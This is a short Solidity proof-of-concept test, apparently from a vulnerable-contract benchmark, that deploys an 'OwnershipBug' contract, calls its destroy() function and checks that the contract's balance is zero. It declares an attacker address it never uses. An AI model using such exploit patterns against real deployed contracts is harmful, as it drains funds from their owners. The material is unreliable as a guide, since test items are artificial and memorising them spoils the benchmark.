// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/da51b355-8ab8-447c-9497-f80be5933694_OwnershipBug.sol";

contract PocTest is BaseTestWithBalanceLog {
    OwnershipBug target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new OwnershipBug();
    }

    function testExploit() public balanceLog {
        target.destroy();
        assertEq(address(target).balance, 0);
    }
}
